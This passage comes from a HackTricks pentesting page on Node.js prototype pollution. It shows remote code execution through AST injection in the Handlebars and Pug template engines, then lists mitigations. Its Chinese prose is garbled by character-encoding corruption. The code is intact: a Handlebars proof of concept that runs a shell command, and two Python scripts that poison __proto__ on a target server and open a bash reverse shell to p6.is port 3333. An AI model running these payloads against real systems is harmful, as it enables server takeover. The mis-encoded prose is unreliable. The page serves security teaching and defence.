<li><strong>ç¼–è¯‘å™¨çš„å¤„ç†</strong>ï¼šç¼–è¯‘å™¨å¯ä»¥å¤„ç† AST å¯¹è±¡æˆ–å­—ç¬¦ä¸²æ¨¡æ¿ã€‚å¦‚æœ <code>input.type</code> ç­‰äº <code>Program</code>ï¼Œåˆ™è¾“å…¥è¢«è§†ä¸ºé¢„è§£æï¼Œè¿™å¯ä»¥è¢«åˆ©ç”¨ã€‚</li>
<li><strong>ä»£ç æ³¨å…¥</strong>ï¼šé€šè¿‡æ“æ§ <code>Object.prototype</code>ï¼Œå¯ä»¥å°†ä»»æ„ä»£ç æ³¨å…¥æ¨¡æ¿å‡½æ•°ï¼Œè¿™å¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</li>
</ol>
<p>ä¸€ä¸ªæ¼”ç¤º Handlebars æ¼æ´åˆ©ç”¨çš„ç¤ºä¾‹ï¼š</p>
<pre><code class="language-javascript">const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];

const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());
</code></pre>
<p>è¿™æ®µä»£ç å±•ç¤ºäº†æ”»å‡»è€…å¦‚ä½•å°†ä»»æ„ä»£ç æ³¨å…¥åˆ° Handlebars æ¨¡æ¿ä¸­ã€‚</p>
<p><strong>å¤–éƒ¨å‚è€ƒ</strong>ï¼šåœ¨ 'flat' åº“ä¸­å‘ç°äº†ä¸åŸå‹æ±¡æŸ“ç›¸å…³çš„é—®é¢˜ï¼Œè¯¦ç»†ä¿¡æ¯è§æ­¤å¤„ï¼š<a href="https://github.com/hughsk/flat/issues/105">GitHub é—®é¢˜</a>ã€‚</p>
<p><strong>å¤–éƒ¨å‚è€ƒ</strong>ï¼š<a href="https://github.com/hughsk/flat/issues/105">ä¸ 'flat' åº“ä¸­çš„åŸå‹æ±¡æŸ“ç›¸å…³çš„é—®é¢˜</a></p>
<p>Python ä¸­åŸå‹æ±¡æŸ“åˆ©ç”¨çš„ç¤ºä¾‹ï¼š</p>
<pre><code class="language-python">import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i &gt;&amp; /dev/tcp/p6.is/3333 0&gt;&amp;1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
</code></pre>
<h4 id="pug-æ¼æ´"><a class="header" href="#pug-æ¼æ´">Pug æ¼æ´</a></h4>
<p>Pugï¼Œå¦ä¸€ä¸ªæ¨¡æ¿å¼•æ“ï¼Œé¢ä¸´ç€ç±»ä¼¼çš„åŸå‹æ±¡æŸ“é£é™©ã€‚è¯¦ç»†ä¿¡æ¯å¯åœ¨å…³äº <a href="https://blog.p6.is/AST-Injection/#Pug">Pug ä¸­çš„ AST æ³¨å…¥</a> çš„è®¨è®ºä¸­æ‰¾åˆ°ã€‚</p>
<p>Pug ä¸­åŸå‹æ±¡æŸ“çš„ç¤ºä¾‹ï¼š</p>
<pre><code class="language-python">import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i &gt;&amp; /dev/tcp/p6.is/3333 0&gt;&amp;1'`)"
}
})

# execute
requests.get(TARGET_URL)
</code></pre>
<h3 id="é¢„é˜²æªæ–½"><a class="header" href="#é¢„é˜²æªæ–½">é¢„é˜²æªæ–½</a></h3>
<p>ä¸ºäº†é™ä½åŸå‹æ±¡æŸ“çš„é£é™©ï¼Œå¯ä»¥é‡‡ç”¨ä»¥ä¸‹ç­–ç•¥ï¼š</p>
<ol>
<li><strong>å¯¹è±¡ä¸å¯å˜æ€§</strong>ï¼šå¯ä»¥é€šè¿‡åº”ç”¨ <code>Object.freeze</code> æ¥ä½¿ <code>Object.prototype</code> ä¸å¯å˜ã€‚</li>
<li><strong>è¾“å…¥éªŒè¯</strong>ï¼šJSON è¾“å…¥åº”ä¸¥æ ¼æ ¹æ®åº”ç”¨ç¨‹åºçš„æ¶æ„è¿›è¡ŒéªŒè¯ã€‚</li>
<li><strong>å®‰å…¨åˆå¹¶å‡½æ•°</strong>ï¼šåº”é¿å…ä¸å®‰å…¨çš„é€’å½’åˆå¹¶å‡½æ•°ä½¿ç”¨ã€‚</li>
<li><strong>æ— åŸå‹å¯¹è±¡</strong>ï¼šå¯ä»¥ä½¿ç”¨ <code>Object.create(null)</code> åˆ›å»ºæ²¡æœ‰åŸå‹å±æ€§çš„å¯¹è±¡ã€‚</li>
<li><strong>ä½¿ç”¨ Map</strong>ï¼šåº”ä½¿ç”¨ <code>Map</code> æ¥å­˜å‚¨é”®å€¼å¯¹ï¼Œè€Œä¸æ˜¯ <code>Object</code>ã€‚</li>
<li><strong>åº“æ›´æ–°</strong>ï¼šé€šè¿‡å®šæœŸæ›´æ–°åº“æ¥çº³å…¥å®‰å…¨è¡¥ä¸ã€‚</li>
<li><strong>Linter å’Œé™æ€åˆ†æå·¥å…·</strong>ï¼šä½¿ç”¨åƒ ESLint è¿™æ ·çš„å·¥å…·åŠé€‚å½“çš„æ’ä»¶æ¥æ£€æµ‹å’Œé˜²æ­¢åŸå‹æ±¡æŸ“æ¼æ´ã€‚</li>
<li><strong>ä»£ç å®¡æŸ¥</strong>ï¼šå®æ–½å…¨é¢çš„ä»£ç å®¡æŸ¥ï¼Œä»¥è¯†åˆ«å’Œä¿®å¤ä¸åŸå‹æ±¡æŸ“ç›¸å…³çš„æ½œåœ¨é£é™©ã€‚</li>
<li><strong>å®‰å…¨åŸ¹è®­</strong>ï¼šæ•™è‚²å¼€å‘äººå‘˜äº†è§£åŸå‹æ±¡æŸ“çš„é£é™©åŠç¼–å†™å®‰å…¨ä»£ç çš„æœ€ä½³å®è·µã€‚</li>
<li><strong>è°¨æ…ä½¿ç”¨åº“</strong>ï¼šåœ¨ä½¿ç”¨ç¬¬ä¸‰æ–¹åº“æ—¶è¦è°¨æ…ã€‚è¯„ä¼°å…¶å®‰å…¨æ€åŠ¿å¹¶å®¡æŸ¥å…¶ä»£ç ï¼Œç‰¹åˆ«æ˜¯é‚£äº›æ“ä½œå¯¹è±¡çš„åº“ã€‚</li>
<li><strong>è¿è¡Œæ—¶ä¿æŠ¤</strong>ï¼šé‡‡ç”¨è¿è¡Œæ—¶ä¿æŠ¤æœºåˆ¶ï¼Œä¾‹å¦‚ä½¿ç”¨å®‰å…¨å¯¼å‘çš„ npm åŒ…ï¼Œè¿™äº›åŒ…å¯ä»¥æ£€æµ‹å’Œé˜²æ­¢åŸå‹æ±¡æŸ“æ”»å‡»ã€‚</li>
</ol>
<h2 id="å‚è€ƒæ–‡çŒ®"><a class="header" href="#å‚è€ƒæ–‡çŒ®">å‚è€ƒæ–‡çŒ®</a></h2>
<ul>
<li><a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/">https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/</a></li>
<li><a href="https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l">https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l</a></li>
<li><a href="https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7">https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7</a></li>
<li><a href="https://blog.p6.is/AST-Injection/">https://blog.p6.is/AST-Injection/</a></li>
</ul>
<p>{% hint style="success" %}
Learn &amp; practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
Learn &amp; practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>ç”µæŠ¥ç¾¤ç»„</strong></a> æˆ– <strong>åœ¨</strong> <strong>Twitter</strong> ğŸ¦ <strong>ä¸Šå…³æ³¨æˆ‘ä»¬</strong> <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../../pentesting-web/deserialization/index.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/client-side-prototype-pollution.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../../pentesting-web/deserialization/index.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/client-side-prototype-pollution.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../../elasticlunr.min.js"></script>
        <script src="../../../mark.min.js"></script>
        <script src="../../../searcher.js"></script>

        <script src="../../../clipboard.min.js"></script>
        <script src="../../../highlight.js"></script>
        <script src="../../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
